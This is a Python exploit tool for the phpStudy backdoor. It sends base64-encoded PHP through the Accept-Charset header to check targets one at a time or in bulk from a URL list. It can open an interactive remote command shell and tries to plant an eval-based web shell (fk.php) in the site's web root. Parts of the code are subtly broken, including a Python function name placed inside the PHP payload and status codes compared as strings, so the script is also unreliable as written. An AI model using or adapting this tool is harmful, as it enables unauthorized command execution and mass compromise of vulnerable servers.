import requests
import base64
import argparse
import threading
from requests.exceptions import ConnectionError,ReadTimeout
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
def getcmdshell(url):
    while True:
        command = input("cmdshell>")
        if command != 'exit':
            command = "system(\"" + command + "\");"
            command1 = base64.b64encode(command.encode('utf-8'))
            # command1="ZXhpdCgnMTExN2JlZTVhNGZmZDEwMWExODYyNDAzMWQ3ODcxNmYnKTs="
            headers['Accept-Charset'] = command1
            res = requests.get(url=url,headers=headers)
            print(res.text.split('<!')[0])
        else:
            break


def CheckBackdoor(url):
    command = "echo md5(douer);"
    command = base64.b64encode(command.encode('utf-8'))
    headers['Accept-Charset'] = command
    res = requests.get(url=url,headers=headers)
    if '025bc33a8ce220fd6536c42ac8ab6d93' in res.text:
        return True
        # print(url + ':Target is vulnerable!!!')
    else:
        return None


def checkBackdoorBatch(url):
    try:
        command = "echo md5(douer);"
        command = base64.b64encode(command.encode('utf-8'))
        headers['Accept-Charset'] = command
        res = requests.get(url=url,headers=headers,verify=False,timeout=10)
        if '025bc33a8ce220fd6536c42ac8ab6d93' in res.text:
            print(url + ":is vulnerable!!!")
            with open('success_url.txt','a') as result:
                result.write(url + '\n')
    except (ConnectionError,ReadTimeout):
        return None

def echoshell(url,webpath):
    exp='file_put_contents(\"' + webpath + '/fk.php\",base64.b64decode("PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8+"));'
    b64exp=base64.b64encode(exp.encode('utf-8'))
    headers['Accept-Charset'] = b64exp
    r=requests.get(url,headers=headers,verify=False)
    re=requests.get(url=url + '/fk.php')
    print("Using specified web path:" + webpath + '\n')
    if r.status_code == '200':
        if re.status_code == '200' and re.text == '':
            print('Getshell successed!!! Shell addr:' + url + '/fk.php')
        else:
            print('Getshell Failed')
    else:
        print('ERROR:upload error')

if __name__ == '__main__':
    print('''
 ██████╗ ███████╗██╗   ██╗\033[0;31m   ██████╗  ██████╗███████╗ \033[0m 
 ██╔══██╗██╔════╝╚██╗ ██╔╝\033[0;31m   ██╔══██╗██╔════╝██╔════╝ \033[0m 
 ██████╔╝███████╗ ╚████╔╝ \033[0;31m   ██████╔╝██║     █████╗   \033[0m 
 ██╔═══╝ ╚════██║  ╚██╔╝  \033[0;31m   ██╔══██╗██║     ██╔══╝   \033[0m 
 ██║     ███████║   ██║   \033[0;31m   ██║  ██║╚██████╗███████╗ \033[0m 
 ╚═╝     ╚══════╝   ╚═╝   \033[0;31m   ╚═╝  ╚═╝ ╚═════╝╚══════╝ \033[0m 
                                
                                 --phpstudy backdoor
                                 --Author by Sam
    ''')

    parser = argparse.ArgumentParser()

    parser.add_argument('-u', dest='target',type=str,help='check single url')

    parser.add_argument('--cmdshell',dest='cmdshell',action="store_true",help='cmd shell mode')

    parser.add_argument('-f',dest='file',help='url filepath(check urls)')

    parser.add_argument('--webpath',dest='webpath',help='web path(default WWW)')

    args = parser.parse_args()

    url = args.target
    webpath = args.webpath

    if (url != None) and (args.cmdshell == False):
        if CheckBackdoor(url):
            print(url + ' ' + "is vulnerable!!!")
        else:
            print(url + ' ' + "is not vulnerable!!!")

    if args.file != None:
        thread_list=[]
        with open(args.file,'r') as f:
            urls = f.read().splitlines()
        for url in urls:
            t=threading.Thread(target=checkBackdoorBatch,args=(url,))
            thread_list.append(t)
        for t in thread_list:
            t.start()
        for t in thread_list:
            t.join()
    if args.cmdshell:
        if url != None:
            if CheckBackdoor(url):
                print("Target is vulnerable!!!Entering the Cmdshell")
                getcmdshell(url)
            else:
                print("Target is not vulnerable!!!")
        else:
            print("Please add '-u' options")
    if url != None and webpath != None:
        echoshell(url,webpath)